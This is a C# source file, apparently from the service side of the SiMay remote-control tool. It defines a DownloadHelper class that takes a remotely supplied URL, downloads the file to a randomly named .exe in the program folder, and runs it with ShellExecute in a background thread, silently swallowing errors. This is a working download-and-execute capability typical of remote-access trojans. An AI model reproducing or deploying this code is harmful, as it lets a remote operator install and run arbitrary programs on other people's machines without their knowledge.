using SiMay.Core;
using SiMay.Core.Extensions;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static SiMay.ServiceCore.Win32Api;

namespace SiMay.ServiceCore.MainService
{

    public class DownloadHelper
    {

        public static void DownloadFile(byte[] pData)
        {
            string URL = pData.ToUnicodeString();
            if (URL == "" || URL == null) return;

            string filename = Application.StartupPath + @"\" + GetRandomString(5) + DateTime.Now.ToFileTime().ToString() + ".exe";
            new Thread(delegate ()
            {
                try
                {
                    System.Net.HttpWebRequest Myrq = (System.Net.HttpWebRequest)System.Net.HttpWebRequest.Create(URL);
                    System.Net.HttpWebResponse myrp = (System.Net.HttpWebResponse)Myrq.GetResponse();
                    long totalBytes = myrp.ContentLength;
                    if (myrp.ContentLength != 0)
                    {
                        System.IO.Stream st = myrp.GetResponseStream();
                        System.IO.Stream so = new System.IO.FileStream(filename, System.IO.FileMode.Create);
                        long totalDownloadedByte = 0;
                        byte[] by = new byte[1024];
                        int osize = st.Read(by, 0, (int)by.Length);
                        while (osize > 0)
                        {
                            totalDownloadedByte = osize + totalDownloadedByte;
                            so.Write(by, 0, osize);
                            osize = st.Read(by, 0, (int)by.Length);
                        }
                        so.Close();
                        st.Close();
                        ShellExecute(IntPtr.Zero, "open", filename, null, null, ShowWindowCommands.SW_SHOWNORMAL);
                    }
                    myrp.Close();
                    Myrq.Abort();
                }
                catch { }
            })
            {
                IsBackground = true
            }
            .Start();
        }

        public static string GetRandomString(int RandomLength)
        {
            string RandomString = "0123456789ABCDEFGHIJKMLNOPQRSTUVWXYZ";
            Random Random = new Random(DateTime.Now.Second);
            string returnValue = string.Empty;
            for (int i = 0; i < RandomLength; i++)
            {
                int r = Random.Next(0, RandomString.Length - 1);
                returnValue += RandomString[r];
            }
            return returnValue;
        }
    }
}